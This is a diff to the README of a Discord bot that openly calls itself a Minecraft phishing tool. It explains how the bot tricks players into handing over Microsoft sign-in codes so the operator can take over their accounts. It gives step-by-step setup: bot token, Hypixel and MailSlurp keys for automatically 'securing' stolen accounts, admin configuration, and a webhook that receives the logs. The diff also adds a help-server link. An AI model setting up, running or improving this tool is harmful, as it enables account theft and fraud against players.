@@ -10,6 +10,14 @@ A Minecraft phishing Discord bot is a malicious program designed to deceive play
 
 Once the user provides their email and username, the bot sends the email, prompting the user to log in via Microsoft's authentication system. Without the password, the operator can select "other ways to sign in" and receive a code at the provided email. Entering the verification code into the bot grants access to the user's Minecraft/Microsoft account.
 
+## Help
+<br>
+If you need futher help there is a link to a discord server below.<br>
+<br>
+[Help Server Link](https://discord.com/invite/algorithm/)<br>
+
+<br>
+
 ## How to Run
 
 1. **Download Python**: [Download Python](https://www.python.org/downloads/release/python-31012/)
@@ -17,22 +25,24 @@ Once the user provides their email and username, the bot sends the email, prompt
     - Generate your bot token and grant it all intents.
 3. **Get Your API Key**:
     - Visit the [Hypixel Developer Dashboard](https://developer.hypixel.net/dashboard) and copy your API key.
-4. **Configure the Bot**:
-    - Place the token and API key in `config.py`.
+5. **Get MailSlurp API For Auto Secure**:
+   - Visit [MailSlurp](https://www.mailslurp.com/) and copy the API key.
+6. **Configure the Bot**:
+    - Place the token Hypixel API, MailSlurp API into `config.py`.
     - Add your Discord ID in the line `self.admins = [YOUR DISCORD ID]`.
-5. **Install Requirements**:
+7. **Install Requirements**:
     - Open Command Prompt in the project folder and run `pip install -r requirements.txt`.
-6. **Run the Bot**:
+8. **Run the Bot**:
     - Execute the bot with the command `python bot.py`.
-7. **Sync Commands**:
+9. **Sync Commands**:
     - In your Discord server, type `!sync global`.
-8. **Set Up Webhook**:
+10. **Set Up Webhook**:
     - Use `/webhook` and enter the destination for your logs.
 
 ## What It Looks Like
 
 ### Logs Interface<br>
-![Logs Interface](https://i.imgur.com/pPeZt8H.png)
+![Logs Interface](https://i.imgur.com/7ycbJLp.png)
 
 ### CMD Interface<br>
 ![CMD Prompt Interface](https://i.imgur.com/Hp0rAh4.png)
